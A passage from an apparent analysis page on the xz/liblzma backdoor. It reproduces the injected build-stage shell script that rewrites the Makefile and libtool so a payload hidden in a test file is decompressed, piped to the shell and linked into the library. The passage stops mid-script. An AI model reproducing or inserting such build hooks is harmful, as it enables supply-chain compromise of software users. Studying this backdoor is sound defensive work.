<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png?size=small" data-sub-html="<h2>image-20240406212656571</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png" alt="image-20240406212656571" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406212656571.png?size=large 2x" data-title="image-20240406212656571" style="--width: 2212px;--aspect-ratio: 2212 / 1204;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">P</span><span class="o">=</span><span class="s2">&#34;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">C</span><span class="o">=</span><span class="s2">&#34;pic_flag=\&#34; </span><span class="nv">$P</span><span class="s2">\&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">O</span><span class="o">=</span><span class="s2">&#34;^pic_flag=\&#34; -fPIC -DPIC\&#34;</span>$<span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">R</span><span class="o">=</span><span class="s2">&#34;is_arch_extension_supported&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="s2">&#34;__get_cpuid(&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">p</span><span class="o">=</span><span class="s2">&#34;good-large_compressed.lzma&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">U</span><span class="o">=</span><span class="s2">&#34;bad-3-corrupt_lzma2.xz&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcVq</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f config.status<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcSS</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^LD<span class="o">=</span><span class="se">\&#39;\/</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^CC<span class="o">=</span><span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^GCC<span class="o">=</span><span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^srcdir<span class="o">=</span><span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^build<span class="o">=</span><span class="se">\&#39;</span>x86_64 config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^enable_shared<span class="o">=</span><span class="se">\&#39;</span>yes<span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^enable_static<span class="o">=</span><span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^gl_path_map<span class="o">=</span><span class="se">\&#39;</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKccj</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s1">&#39;\[&#34;HAVE_FUNC_ATTRIBUTE_IFUNC&#34;\]=&#34; 1&#34;&#39;</span> config.status &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s1">&#39;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#39;</span> config.h &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$enable_shared</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;xyes&#34;</span><span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;^x86_64&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;linux-gnu</span>$<span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span><span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">()&#34;</span> <span class="nv">$srcdir</span>/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">()&#34;</span> <span class="nv">$srcdir</span>/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">&#34;</span> <span class="nv">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2">&#34;</span> <span class="nv">$srcdir</span>/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$GCC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xyes&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$CC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xgcc&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">LDv</span><span class="o">=</span><span class="nv">$LD</span><span class="s2">&#34; -v&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nv">$LDv</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -qs <span class="s1">&#39;GNU ld&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/tests/files/</span><span class="nv">$p</span><span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/tests/files/</span><span class="nv">$U</span><span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/debian/rules&#34;</span> <span class="o">||</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$RPM_ARCH</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;xx86_64&#34;</span><span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcst</span>
</span></span><span class="line"><span class="cl"><span class="nv">j</span><span class="o">=</span><span class="s2">&#34;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$j</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">z</span><span class="o">=</span><span class="s2">&#34;^am__uninstall_files_from_dir = {&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$z</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">w</span><span class="o">=</span><span class="s2">&#34;^am__install_max =&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$w</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">E</span><span class="o">=</span><span class="nv">$z</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$E</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">Q</span><span class="o">=</span><span class="s2">&#34;^am__vpath_adj_setup =&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$Q</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">M</span><span class="o">=</span><span class="s2">&#34;^am__include = include&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$M</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">L</span><span class="o">=</span><span class="s2">&#34;^all: all-recursive</span>$<span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$L</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">m</span><span class="o">=</span><span class="s2">&#34;^LTLIBRARIES = \$(lib_LTLIBRARIES)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$m</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">u</span><span class="o">=</span><span class="s2">&#34;AM_V_CCLD = \$(am__v_CCLD_\$(V))&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$u</span><span class="s2">&#34;</span> src/liblzma/Makefile &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$O</span><span class="s2">&#34;</span> libtool &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcTy</span>
</span></span><span class="line"><span class="cl"><span class="nv">b</span><span class="o">=</span><span class="s2">&#34;am__test = </span><span class="nv">$U</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$j</span><span class="s2">/i</span><span class="nv">$b</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">d</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$gl_path_map</span> <span class="p">|</span> sed <span class="s1">&#39;s/\\\/\\\\\\\\/g&#39;</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nv">b</span><span class="o">=</span><span class="s2">&#34;am__strip_prefix = </span><span class="nv">$d</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$w</span><span class="s2">/i</span><span class="nv">$b</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">b</span><span class="o">=</span><span class="s2">&#34;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$E</span><span class="s2">/i</span><span class="nv">$b</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">b</span><span class="o">=</span><span class="s2">&#34;\$(top_srcdir)/tests/files/\$(am__test)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">s</span><span class="o">=</span><span class="s2">&#34;am__test_dir=</span><span class="nv">$b</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$Q</span><span class="s2">/i</span><span class="nv">$s</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">h</span><span class="o">=</span><span class="s2">&#34;-Wl,--sort-section=name,-X&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$LDFLAGS</span><span class="s2">&#34;</span> <span class="p">|</span> grep -qs -e <span class="s2">&#34;-z,now&#34;</span> -e <span class="s2">&#34;-z -Wl,now&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">h</span><span class="o">=</span><span class="nv">$h</span><span class="s2">&#34;,-z,now&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">j</span><span class="o">=</span><span class="s2">&#34;liblzma_la_LDFLAGS += </span><span class="nv">$h</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$L</span><span class="s2">/i</span><span class="nv">$j</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;s/</span><span class="nv">$O</span><span class="s2">/</span><span class="nv">$C</span><span class="s2">/g&#34;</span> libtool <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">k</span><span class="o">=</span><span class="s2">&#34;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&#34;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;s/</span><span class="nv">$u</span><span class="s2">/</span><span class="nv">$k</span><span class="s2">/&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">l</span><span class="o">=</span><span class="s2">&#34;LTDEPS=&#39;\$(lib_LTDEPS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export top_srcdir=&#39;\$(top_srcdir)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export CC=&#39;\$(CC)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export DEFS=&#39;\$(DEFS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export DEFAULT_INCLUDES=&#39;\$(DEFAULT_INCLUDES)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export INCLUDES=&#39;\$(INCLUDES)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export liblzma_la_CPPFLAGS=&#39;\$(liblzma_la_CPPFLAGS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export CPPFLAGS=&#39;\$(CPPFLAGS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export AM_CFLAGS=&#39;\$(AM_CFLAGS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export CFLAGS=&#39;\$(CFLAGS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export AM_V_CCLD=&#39;\$(am__v_CCLD_\$(V))&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export liblzma_la_LINK=&#39;\$(liblzma_la_LINK)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export libdir=&#39;\$(libdir)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export liblzma_la_OBJECTS=&#39;\$(liblzma_la_OBJECTS)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">    export liblzma_la_LIBADD=&#39;\$(liblzma_la_LIBADD)&#39;; \\\\\n\
</span></span></span><span class="line"><span class="cl"><span class="s2">sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">sed -i <span class="s2">&#34;/</span><span class="nv">$m</span><span class="s2">/i</span><span class="nv">$l</span><span class="s2">&#34;</span> src/liblzma/Makefile <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcHD</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">(</span><span class="nb">test</span> -f .libs/liblzma_la-crc64_fast.o<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">test</span> -f .libs/liblzma_la-crc32_fast.o<span class="o">)</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcKQ</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">()&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc64_fast.c<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
